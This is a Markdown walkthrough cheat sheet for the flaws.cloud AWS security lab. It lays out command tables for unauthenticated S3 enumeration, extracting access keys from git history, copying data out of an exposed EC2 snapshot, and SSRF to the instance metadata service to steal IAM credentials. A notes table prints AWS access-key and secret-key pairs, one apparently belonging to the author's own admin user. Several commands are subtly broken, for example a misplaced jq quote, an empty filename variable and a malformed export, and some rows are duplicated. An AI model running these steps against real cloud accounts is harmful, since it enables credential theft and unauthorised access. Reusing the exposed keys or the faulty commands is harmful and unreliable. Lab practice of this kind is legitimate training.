# Flaws.Cloud 1 - Walkthrough Cheat Sheet



## Guide Table of Contents
- [Flaws.Cloud 1 - Walkthrough Cheat Sheet](#flawscloud-1---walkthrough-cheat-sheet)
  - [Guide Table of Contents](#guide-table-of-contents)
  - [Challenge Prerequisites](#challenge-prerequisites)
  - [Challenge Tools](#challenge-tools)
  - [Guide Table of Contents](#guide-table-of-contents-1)
  - [Commands Used in Challenge](#commands-used-in-challenge)
  - [Important Notes from Challenge](#important-notes-from-challenge)
- [Levels](#levels)
  - [Level 0 -  Level 0 Name](#level-0----level-0-name)
    - [Level 0 Prerequisites](#level-0-prerequisites)
    - [Level 0 Tools](#level-0-tools)
    - [Commands Used in Level 0](#commands-used-in-level-0)
  - [Important Notes from Level 0](#important-notes-from-level-0)
  - [Level 1 - AWS Un-Authenticated Enumeration](#level-1---aws-un-authenticated-enumeration)
    - [Level 1 Prerequisites](#level-1-prerequisites)
    - [Level 1 Tools](#level-1-tools)
    - [Commands Used in Level 1](#commands-used-in-level-1)
  - [Important Notes from Level 1](#important-notes-from-level-1)
  - [Level 2 -  AWS Authenticated Enumeration](#level-2----aws-authenticated-enumeration)
    - [Level 2 Prerequisites](#level-2-prerequisites)
    - [Level 2 Tools](#level-2-tools)
    - [Commands Used in Level 2](#commands-used-in-level-2)
  - [Important Notes from Level 2](#important-notes-from-level-2)
  - [Level 3 -  Access Key in Git Log Commits](#level-3----access-key-in-git-log-commits)
    - [Level 3 Prerequisites](#level-3-prerequisites)
    - [Level 3 Tools](#level-3-tools)
    - [Commands Used in Level 3](#commands-used-in-level-3)
    - [Important Notes from Level 3](#important-notes-from-level-3)
  - [Level 4 -  Sensitive Data in EC2 Snapshots](#level-4----sensitive-data-in-ec2-snapshots)
    - [Level 4 Prerequisites](#level-4-prerequisites)
    - [Level 4 Tools](#level-4-tools)
    - [Commands Used in Level 4](#commands-used-in-level-4)
    - [Important Notes from Level 4](#important-notes-from-level-4)
  - [Level 5 -  Level 5 EC2 Metadata 169.254.169.254](#level-5----level-5-ec2-metadata-169254169254)
    - [Level 5 Prerequisites](#level-5-prerequisites)
    - [Level 5 Tools](#level-5-tools)
    - [Commands Used in Level 5](#commands-used-in-level-5)
    - [Important Notes from Level 5](#important-notes-from-level-5)
  - [Final Level 6 -  Final Level 6 Name](#final-level-6----final-level-6-name)
    - [Final Level 6 Prerequisites](#final-level-6-prerequisites)
    - [Final Level 6 Tools](#final-level-6-tools)
    - [Commands Used in Final Level 6](#commands-used-in-final-level-6)
    - [Important Notes from Final Level 6](#important-notes-from-final-level-6)










## Challenge Prerequisites
1. AWS Un-Authenticated Enumeration
   1. AWS CLI installed
      1. [installation file script](./Flaws-Scripts/aws_cli_install.sh)
   2. AWS CLI Profile configured
      1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
2. AWS Authenticated Enumeration
   1. AWS CLI installed
      1. [installation file script](./Flaws-Scripts/aws_cli_install.sh)
   2. AWS CLI Profile configured
      1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
   3. Create AWS S3Admin Group
      1. [Group URL](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/groups/details/S3Admins?section=permissions "S3Admins")
   4. Attach AWS AmazonS3FullAccess Policy To S3Admin Group
      1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonS3FullAccess$jsonEditor "AmazonS3FullAccess")
3. Access Key in Git Log Commits
   1. AWS CLI installed
      1. [AWS cli installation file script](./Flaws-Scripts/aws_cli_install.sh)
   2. AWS CLI Profile configured
      1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
   3. Create AWS S3Admin Group
      1. [Group URL](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/groups/details/S3Admins?section=permissions "S3Admins")
   4. Attach AWS AmazonS3FullAccess Policy To S3Admin Group
      1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonS3FullAccess$jsonEditor "AmazonS3FullAccess")
   5. Installed Git CLI
      1. [Git CLI installation file script](./Flaws-Scripts/git_cli_install.sh)
4. Sensitive Data in EC2 Snapshots
   1. AmazonEC2FullAccess Policy Attached to L4Profile
      1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AmazonEC2FullAccess$jsonEditor "AmazonEC2FullAccess")
   2. AdministratorAccess Policy Attached to L4Profile
      1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AdministratorAccess$jsonEditor "AdministratorAccess")
5. EC2 Metadata 169.254.169.254  
   1. Full Update
      1. `sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y`
   2. JQ
      1. [jq](https://stedolan.github.io/jq/ "jq JSON Parser")
6. Level 6
   1. Full Update
      1. `sudo apt-get update -y && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y`
   2. JQ
      1. [jq](https://stedolan.github.io/jq/ "jq JSON Parser")
   3. AWS CLI installed
      1. [AWS cli installation file script](./Flaws-Scripts/aws_cli_install.sh)
   4. AWS CLI Profile configured
      1. [configuration file script](./Flaws-Scripts/aws_cli_configure.sh)
   5. AdministratorAccess Policy Attached to L4Profile
      1. [Policy URL](https://us-east-1.console.aws.amazon.com/iam/home#/policies/arn:aws:iam::aws:policy/AdministratorAccess$jsonEditor "AdministratorAccess")


## Challenge Tools
1. AWS Enumeration Un-Authenticated 
   1. [`nslookup`](https://www.nslookup.io/ "DNS Lookup Tool")
   2. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
   3. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
   4. ['grep'](https://www.gnu.org/software/grep/ "Grep Command Line Tool")
2. AWS Enumeration Authenticated
   1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
   2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
   3. ['grep'](https://www.gnu.org/software/grep/ "Grep Command Line Tool")
3. Access Key in Git Log Commits
   1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
   2. [`aws s3 sync`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 bucket copy Command")
   3. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
   4. [git](https://github.com/git-guides/install-git "Git Command Line Tool")
   5. [git log](https://github.com/git-guides/install-git "Git Command Line Tool")
4. Sensitive Data in EC2 Snapshots
   1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
   2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
   3. [aws sts get-caller-identity](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
   4. [aws ec2 describe-snapshots](https://docs.aws.amazon.com/cli/latest/reference/ec2/describe-snapshots.html "AWS EC2 Describe Snapshots")
   5. [aws ec2 create-key-pair](https://docs.aws.amazon.com/cli/latest/reference/ec2/create-key-pair.html "AWS EC2 Create Key Pair")
   6. [aws ec2 run-instances](https://docs.aws.amazon.com/cli/latest/reference/ec2/run-instances.html "AWS EC2 Run Instances")
   7. [aws ec2 describe-instances](https://docs.aws.amazon.com/cli/latest/reference/ec2/attach-volume.html "AWS EC2 Describe Instances")
   8. [aws ec2 create-volume](https://docs.aws.amazon.com/cli/latest/reference/ec2/create-volume.html "AWS EC2 Create Volume")
   9. [aws ec2 attach-volume](https://docs.aws.amazon.com/cli/latest/reference/ec2/attach-volume.html "AWS EC2 Attach Volume")
   10. [SSH](https://www.ssh.com/ssh/ "SSH Command Line Tool")
   11. [lsblk]("List Dissks Command")
   12. [mount]("Mount Disks Command")
5. EC2 Metadata 169.254.169.254  
   1. [`aws s3 ls`](https://docs.aws.amazon.com/cli/latest/reference/s3/ls.html "AWS S3 List Command")
   2. [`curl`](https://curl.haxx.se/ "Curl Command Line Tool")
   3. [`jq`](https://stedolan.github.io/jq/ "jq JSON Parser")
   4. ['ec2 metadata'](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html "EC2 Metadata Service")
   5. ['iam metadata'](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html "IAM Metadata Service")
6. Level 6
   1. [AWS sts](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
      1. [`aws sts get-caller-identity`](https://docs.aws.amazon.com/cli/latest/reference/sts/get-caller-identity.html "AWS STS Get Caller Identity")
   2. [AWS Lambda](https://docs.aws.amazon.com/lambda/latest/dg/welcome.html "AWS Lambda")
      1. [`aws lambda list-functions`](https://docs.aws.amazon.com/cli/latest/reference/lambda/list-functions.html "AWS Lambda List Functions")
      2. [`aws lambda invoke`](https://docs.aws.amazon.com/cli/latest/reference/lambda/invoke.html "AWS Lambda Invoke")
      3. [`aws lambda get-function`](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-function.html "AWS Lambda Get Function")
      4. [`aws lambda get-policy`](https://docs.aws.amazon.com/cli/latest/reference/lambda/get-policy.html "AWS Lambda Get Policy")
   3. [AWS API Gateway](https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html "AWS API Gateway")
      1. [`aws apigateway get-rest-apis`](https://docs.aws.amazon.com/cli/latest/reference/apigateway/get-rest-apis.html "AWS API Gateway Get Rest APIs")
      2. [`aws apigateaway get-stages`](https://docs.aws.amazon.com/cli/latest/reference/apigateway/get-stages.html "AWS API Gateway Get Stages")
   4. [Linux Text Parsing Tools](https://www.geeksforgeeks.org/linux-text-parsing-tools/ "Linux Text Parsing Tools")
   5. [`xargs -I`](https://www.geeksforgeeks.org/xargs-command-in-linux-with-examples/ "xargs Command")
   6. [`tr`](https://www.geeksforgeeks.org/tr-command-in-linux-with-examples/ "tr Command")
   7.  [`grep`](https://www.geeksforgeeks.org/grep-command-in-linux-unix-with-examples/ "grep Command")
   8.  [`cut -d`](https://www.geeksforgeeks.org/cut-command-linux-examples/ "cut Command")
   9.  [`sort`](https://www.geeksforgeeks.org/sort-command-linuxunix-examples/ "sort Command")
   10. [`uniq`](https://www.geeksforgeeks.org/uniq-command-linux-examples/ "uniq Command")








## Guide Table of Contents







## Commands Used in Challenge 
| 1. :pager: Command                                                                        | Description                                                             |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 1.0. :pager: AWS Un-Authenticated Enumeration                                             | Un-Authenticated Access to  AWS S3 Buckets                               |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 1.1. :pager:  `./Flaws-Scripts/aws_cli_install.sh`   | Install AWS CLI                        |
| 1.2. :pager:  `./Flaws-Scripts/aws_cli_configure.sh`   | Configure                        |
| 1.3. :pager:  `CHALLENGE_URL="flaws.cloud" && nslookup $CHALLENGE_URL`                                                           | Execute NS Lookup Against Challenge URL                               |   
| 1.4. :pager:  `nslookup $L1_BUCKET_IP`                                                           | Execute NS Lookup Against Discovered IP                               |   
| 1.5. :pager   `aws s3 ls  $L1_BUCKET_URL --no-sign-request --region $AWS_REGION`                | Access & List S3 Bucket Files using AWS CLI - Un-Authenticated        |
| 1.6/1.1. :pager:  `aws s3 sync $L1_BUCKET_URL --no-sign-request --region $AWS_REGION ./flaws1`   | Copy Bucket Files                        |
| 1.6/1.2. :pager:  `export L2_URL=$(cat flaws1/$L1_SECRET_FILE | grep -oP '<a href="\K[^"]+')`   | Get Level 2 URL From Secret File                        |
| 1.6/2.1. :pager:  `export L2_URL=$(curl -s $L1_SECRET_URL | grep -oP '<a href="\K[^"]+')`   | Get Level 2 URL From Secret File                        |
| 1.7. :pager:  `Flaws-Scripts/aws_cli_configure_awsS3Admin.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 2. :pager: Command                                                                        | Description                                                             |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 2.0. :pager: AWS Authenticated Enumeration                                                 | All Authenticated Access to AWS S3 Buckets                               |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 2.1. :pager:  `./Flaws-Scripts/aws_cli_configure.sh`   | Configure AWS CLI                        |
| 2.2. :pager:   `./Flaws-Scripts/aws_cli_configure_awsS3Admin.sh` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 2.2. :pager: `aws s3 ls --profile $AWS_USER_NAME $L2_BUCKET_URL` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 2.3/1.1. :pager: `aws s3 sync --profile $AWS_USER_NAME $L2_BUCKET_URL --region $AWS_REGION ./flaws2`     | Copy Bucket Files                                                |
| 2.3/2.1. :pager: `aws s3 cp --profile $AWS_USER_NAME $L2_SECRET_URL .`     | Copy Secret From Bucket                                                |
| 2.4. :pager: `export L2_SECRET_URL=$( cat flaws2/$L2_SECRET_FILE | grep -oP '<a href="\K[^"]+')`    | Cat Secret and Grep URL        |
| 2.5. :pager:  `Flaws-Scripts/aws_cli_configure_awsS3Admin.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3. :pager: Command                                                                           | Description                                                             |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3.0. :pager: Access Key in Git Log Commits                                                | Older Git Commits Contains access_keys.txt                                 |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------     |
| 3.1. :pager:  `Flaws-Scripts/aws_cli_configure.sh`   | Configure AWS CLI                        |
| 3.2. :pager: `aws s3 ls --profile $AWS_USER_NAME $L3_BUCKET_URL` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.2. :pager: `aws s3 ls $L3_BUCKET_URL --no-sign-request --region $AWS_REGION` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.3. :pager: `aws s3 sync --profile $AWS_USER_NAME $L3_BUCKET_URL --region $AWS_REGION ./flaws3` | Access & List S3 Bucket Files using AWS CLI - Authenticated |
| 3.4. :pager: `cd flaws3 && git log` | View Latest Git Commit Log  |
| 3.5. :pager: `git checkout $L3_COMMIT` | View Latest Git Commit Log  |
| 3.6. :pager: `export L3_ACCESS_KEY=$(grep -oP '^access_key\s+\K[A-Za-z0-9]+' $L3_SECRET_FILE)` | Get AWS Level Access Key  |
| 3.7. :pager: `export L3_SECRET_KEY=$(grep -oP '^secret_access_key\s+\K[A-Za-z0-9+/]+' $L3_SECRET_FILE)` | Get AWS Secret Access Key  |
| 3.8. :pager: `Scrtips/aws_cli_configure_L3Profile.sh` | Set L3 Found Profile URL  |
| 3.9. :pager: `aws --profile $L3_USER s3 ls` | List all S3 Buckets  |
| 3.10. :pager: `aws s3 ls --profile $L3_USER_NAME | grep -oP 'level4-\S+\.flaws\.cloud'` | Get Level 4 URL (All Levels)  |
| 3.11. :pager:  `Flaws-Scripts/aws_cli_configure_L3Profile.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 4. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 4.0. :pager: Sensitive Data in EC2 Snapshots                                                    | Sensitive Nginx Credentials in EC2 Snapshot                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 4.1. :pager:  `Flaws-Scripts/aws_cli_configure_L3Profile.sh`   | Configure AWS CLI                        |
| 4.2. :pager:  `export L4_ACCOUNT_ID=$(aws --profile "$L3_USER_NAME" sts get-caller-identity --query 'Account' --output text)`   | Identify Account Id  |
| 4.3. :pager:  `export L4_SNAPSHOT_ID=$(aws --profile $L3_USER_NAME ec2 describe-snapshots --owner-id $L4_ACCOUNT_ID --query 'Snapshots[*].{ID:SnapshotId}' --output text)`   | Get Snapsot ID |
| 4.4. :pager:  `export L4_VOLUME_ID=$(aws --profile $L4_USER ec2 create-volume --availability-zone $L4_AWS_AZ --region $AWS_REGION  --snapshot-id  $L4_SNAPSHOT_ID --query 'VolumeId' --output text)`   | Mount Snapshot ID to Volume                       |
| 4.5. :pager: ```aws --profile "$L4_USER" --region "$AWS_REGION" ec2 create-key-pair --key-name "$L4_KEY" --query 'KeyMaterial' --output text > "${}.pem"```   | Create Key Pair                        |
| 4.6. :pager:  `export L4_NEW_VM_ID=$(aws ec2 run-instances --profile "$L4_USER" --region "$AWS_REGION" --image-id "$L4_IMAGE" --instance-type "$L4_INSTANCE_TYPE" --key-name "$L4_KEY" --tag-specifications "ResourceType=instance,Tags=[{Key=Name,Value=${L4_VM_NAME}}]" --query 'Instances[0].InstanceId' --output text)`   | Launch EC2 Instance  & Get Instance Id                     |
| 4.7. :pager:  `echo $L4_NEW_VM_ID`   | Print New VM ID                     |
| 4.8. :pager:  ```export L4_NEW_VM_IP =$(aws ec2 describe-instances --profile $L4_USER --filters "Name=tag:Name,Values=Flaws_L4_VM" "Name=instance-state-name,Values=running" --query 'Reservations[].Instances[?State.Code==`16`].PublicIpAddress' --output text)```   | Get New EC2 Instance  IP |
| 4.9. :pager:  ```aws ec2 attach-volume --profile $L4_USER --region $AWS_REGION --instance-id $L4_NEW_VM_ID --volume-id $L4_VOLUME_ID --device /dev/xvdf```   | Attach Mounted Volume to VM                     |
| 4.10. :pager:  ```ssh -v -i ./"$L4_KEY.pem" $L4_VM_USER@$L4_VM_HOST```   | ssh into VM                      |
| 4.11. :pager:  ```lsblk ```   | list Drives                      |
| 4.12. :pager:  ```sudo file -s /dev/xvdf1 ```   | View Drive Information                      |
| 4.13. :pager:  ```sudo mount /dev/xvdf1 /mnt && cat /mnt/home/ubuntu/setupNginx.sh```   | Mount Attached Drive  & Print setupNginx File Attached Drive                    |
| 4.14. :pager:  ```export L5_URL=$(curl -u $L4_NGINX_USER:$L4_NGINX_PASSWORD -s $L4_SNAPSHOT_URL | grep -oP '<a href="\K[^"]+')```   | Get Next Level URL                    |
| 4.15. :pager:  `Flaws-Scripts/aws_cli_configure_L4Profile.sh`   | Configure AWS CLI                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.0. :pager: EC2 Metadata 169.254.169.254                                                 | Exposed IAM Credentials in Metadata                                      |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 5.1. :pager:  `Flaws-Scripts/aws_cli_configure_L4Profile.sh`   | Configure AWS CLI                        |
| 5.2. :pager:  `export L5_EC2_URL=4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud"`   | Set EC2 URL Variable                        |
| 5.3. :pager:  `export L5_EC2_PROXY=http://$L5_EC2_URL/proxy`   | Set Proxy URL                        |
| 5.4. :pager:  `export L5_EC2_METADATA_IP=$L5_EC2_PROXY/$EC2_METADATA_IP`   | Get EC2 Metada Service                        |
| 5.5 :pager:   `export L5_EC2_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL`   | Get Metada URL                        |
| 5.6 :pager:   `export L5_EC2_IAM_METADATA_URL=$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_METADATA_URL/$EC2_IAM_METADATA_URL`   | Get IAM Metada URL                        |
| 5.7 :pager:   `export L5_METADATA=$(curl -s "$L5_EC2_METADATA_URL")`   | Get IAM Role Name                        |
| 5.8 :pager:   `export L5_USER=$(curl -s "$L5_EC2_IAM_METADATA_URL")`   | Get IAM Role Name                        |
| 5.9 :pager:   `export L5_USER_METADATA=$(curl -s "$L5_EC2_IAM_METADATA_URL/$L5_USER")`   | Get IAM Metadata Credentials                       |
| 5.10. :pager:  `export L5_ACCESS_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.AccessKeyId)'`   | Get User Access Key                        |
| 5.11. :pager:  `export L5_SECRET_KEY=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.SecretAccessKey')`   | Get User Secret Key                        |
| 5.12. :pager:  `export L5_TOKEN=$(curl -s "$L5_EC2_PROXY/$EC2_METADATA_IP/$EC2_IAM_METADATA_URL/$L5_USER" | jq -r '.Token')`   | Get User Secret Key                        |
| 5.13. :pager:  `Flaws-Scripts/aws_cli_configure_L5Profile.sh`   | Configure AWS CLI                        |
| 5.14. :pager:  `aws s3 ls --profile $L5_USER --region $AWS_REGION $L6_BUCKET_URL`   | List Bucket Files                        |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.0. :pager: Command                                                                           | Description                                                           |
|-------------------------------------------------------------------------------------------|:----------------------------------------------------------------------|
| 6.1. :pager:  `./Flaws-Scripts/aws_cli_configure_L6Profile.sh`   | Configure AWS CLI                        |
| 6.2. :pager:  `aws iam get-user --profile $L6_USER --region $AWS_REGION`   |  Get IAM User Info                         |
| 6.3. :pager:  `export L6_IAM_USER_POLICIES=$(aws iam list-attached-user-policies --user-name "$L6_IAM_USER" --profile "$L6_USER" --region "$AWS_REGION" --query 'AttachedPolicies[].PolicyArn' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" iam get-policy --policy-arn {} --query 'Policy.{PolicyName: PolicyName, PolicyArn: Arn, DefaultVersionId: DefaultVersionId}' --output json | jq -s '.')`   |  Get IAM User Attached Policies                         |  
| 6.4. :pager:  `Flaws-Scripts/aws_iam_full_policies`   |  Get IAM User Attached Policies Full Output                       |  
| 6.5. :pager:  `export L6_ACCOUNT_ID=$(aws --region $AWS_REGION --profile $L6_USER sts get-caller-identity --query 'Account' --output text)`   |  Get Level 6 Account ID                      |  
| 6.6. :pager:  `export L6_EC2_LAMBDA_FUNCTION=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '[:upper:]' '[:lower:]')`   |  Get EC2 Lambda Function Name                       |  
| 6.7. :pager:  `export L6_EC2_LAMBDA_POLICY=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.')`   |  Get EC2 Lambda Function Policy                      |  
| 6.8. :pager:  `export L6_EC2_LAMBDA_ARN_STR=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Condition.ArnLike."AWS:SourceArn"')`   |  Get EC2 Lambda Function ARN STR                      |  
| 6.9. :pager:  `export L6_EC2_LAMBDA_API=$(echo "$L6_EC2_LAMBDA_ARN_STR" | cut -d ':' -f 6 | cut -d '/' -f 1)`   |  Get EC2 Lambda Function API                      |  
| 6.10. :pager:  `export L6_EC2_LAMBDA_STAGE=$(aws --region $AWS_REGION --profile $L6_USER apigateway get-stages --rest-api-id $L6_EC2_LAMBDA_API --query 'item[0].stageName' --output text)`   |  Get EC2 Lambda Function Stage                      |  
| 6.11. :pager:  `export L6_EC2_LAMBDA_SERVICE=$(aws --region $AWS_REGION --profile $L6_USER lambda list-functions --query 'Functions[].FunctionName' --output text | tr '\t' '\n' | xargs -I {} aws --profile "$L6_USER" lambda get-policy --function-name {} --output json | jq -c '{Policy: .Policy|fromjson, RevisionId}' | jq -s '.' | jq '.[].Policy.Statement[].Principal.Service' | tr -d '"' | sed 's/\..*//' | uniq )`   |  Get EC2 Lambda Function Service                      |  
| 6.12. :pager:  `export L6_EC2_LAMBDA_FUNC_DOMAIN=$(echo "$L6_EC2_LAMBDA_ARN_STR" | grep -oP 'arn:aws:\K\w+-\w+')`   |  Get EC2 Lambda Function Domain                      |  
| 6.13. :pager:  `export L6_LAMBDA_FINAL_URL="https://$L6_EC2_LAMBDA_API.$L6_EC2_LAMBDA_FUNC_DOMAIN.$AWS_REGION.amazonaws.com/$L6_EC2_LAMBDA_STAGE/$L6_EC2_LAMBDA_FUNCTION"`   |  Get EC2 Lambda Function Final URL                      |  
| 6.14. :pager:  `export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')`   |  Get Level 6 Final URL                      |  
| 6.14. :pager:  `export L6_FINAL_URL=$(curl -s -X GET "$L6_LAMBDA_FINAL_URL" | grep -oP 'http[s]?://\S+')`   |  Get Level 6 Final URL                      |  









## Important Notes from Challenge
| 1. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 1.0. :pushpin: AWS Un-Authenticated Enumeration                 | Un-Authenticated Access to  AWS S3 Buckets                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 1.1.:pushpin:  Challenge URL    | `flaws.cloud`                                                                                                                         |   
| 1.2.:pushpin:  Bucket IP Example    | `52.92.145.3`                                                                                                                         |   
| 1.3. :pushpin:  Level 1 Bucket URL           | `s3://flaws.cloud.s3-website-us-west-2.amazonaws.com`                                                                               |
| 1.4. :pushpin:  awsS3Admin           | [awsS3Admin](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/users/details/awsS3Admin?section=permissions)      |
| 1.5. :pushpin:  AWS Access Key ID    |  AKIATQBOZIW65PUG4VN7                                                                                                                 |
| 1.6. :pushpin:  AWS Secret Key ID    |  5nNcyDO6TpZKN3WEI9XraGH+bsE7WOPzmM1XALDl                                                                                                                 |
| 2.1. :pushpin:  Level 2 URL          | `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/`                                                                         |
| 1.7. :pushpin:  Level 1 Secret File  | `secret-dd02c7c.html`                                                                                                                 |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 2. :pushpin: Pin                 | Content                                                                                                                                                     |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 2.0. :pushpin: AWS Authenticated Enumeration                 | All Authenticated Access to AWS S3 Buckets                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 2.1. :pushpin:  Level 2 URL          | `http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/`                                                                         |
| 2.1. :pushpin:  Level 2 Bucket URL          | `s3://http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/`                                                                         |
| 2.2. :pushpin:  S3Admins Group       | [S3Admins](https://us-east-1.console.aws.amazon.com/iamv2/home?region=us-west-2#/groups/S3Admins?section=permissions)                 |
| 3.1. :pushpin:  Level 3 URL          | [Level 3 URL](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3. :pushpin: Pin                 | Content                                                                                  |
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3.0. :pushpin: Access Key in Git Log Commits  | Older Git Commits Contains access_keys.txt                                                                        |  
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 3.1. :pushpin:  Level 3 URL          | [Level 3 URL](http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
| 3.2. :pushpin:  Level 3 Bucket URL          | [Level 3 URL](s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud)                                                             |
| 3.3. :pushpin:  Level 3 Sensitive Git Commit          | f52ec03b227ea6094b04e43f475fb0126edb5a61                                                             |
| 3.4. :pushpin:  Level 3 User          | L3Profile                                                             |
| 3.5. :pushpin:  Level 3 Access Keys File          | access_keys.txt                                                             |
| 3.6. :pushpin:  Level 3 Access Key ID          | AKIAJ366LIPB4IJKT7SA                                                             |
| 3.7. :pushpin:  Level 3 Secret Access Key ID          | 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                                                             |
| 4.1. :pushpin: Level 4 URL                             | [Level 4](level4-1156739cfb264ced6de514971a4bef68.flaws.cloud) |      
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 4. :pushpin: Pin                 | Content                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 4.0. :pushpin: Sensitive Data in EC2 Snapshots                 | Sensitive Nginx Credentials in EC2 Snapshot                                                                
|-------------------------------|:----------------------------------------------------------------------------------------------------------------------------------------|
| 4.1. :pushpin:  Level 4 URL          | `http://level4-1156739cfb264ced6de514971a4bef68.flaws.cloud`                                                                         |
| 4.2. :pushpin:  Level 4 EC2 Snapshot          | `http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud`                                                                         |
| 4.3. :pushpin:  Level 4 Account ID          | `975426262029`                                                                         |
| 4.4. :pushpin:  Level 4 EC2 Snapshot ID          | `snap-0b49342abd1bdcb89`                                                                         |
| 4.4. :pushpin:  Level 4 EC2 Volume ID          | `vol-0e68287fb059d731b`                                                                         |
| 4.5. :pushpin:  Level 4 EC2 Image ID          | `ami-0fcf52bcf5db7b003`                                                                         |
| 4.6. :pushpin:  Level 4 EC2 Instance IP          | `54.69.166.141`                                                                         |
| 4.7. :pushpin:  Level 4 EC2 Instace ID          | `i-049e3a08a0f58536b`                                                                         |
| 4.8. :pushpin:  Level 4 Nginx Credentials         | `setupNginx.sh`                                                                         |
